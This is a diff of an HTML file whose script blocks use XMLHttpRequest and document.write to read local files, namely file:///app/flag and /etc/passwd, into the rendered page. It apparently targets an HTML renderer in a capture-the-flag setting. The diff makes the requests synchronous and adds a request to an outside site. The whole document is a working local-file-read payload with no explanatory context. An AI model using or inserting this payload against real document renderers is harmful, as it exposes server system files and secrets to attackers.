@@ -1,13 +1,13 @@
 <html>
     <body>
-aaaa
+aaaa,bbbb
 
 <script>
     x=new XMLHttpRequest;
     x.onload=function(){  
     document.write(this.responseText)
 };
-    x.open("GET","file:///app/flag");
+    x.open("GET","file:///app/flag", false);
     x.send();
 </script>
 
@@ -16,9 +16,18 @@ aaaa
     x.onload=function(){  
     document.write(this.responseText)
 };
-    x.open("GET","file:///etc/passwd");
+    x.open("GET","file:///etc/passwd", false);
     x.send();
 </script>
+
+<script>
+    x=new XMLHttpRequest;
+    x.onload=function(){  
+    document.write(this.responseText)
+};
+    x.open("GET","www.ya.ru", false);
+    x.send();
+</script>        
         
     </body>
 
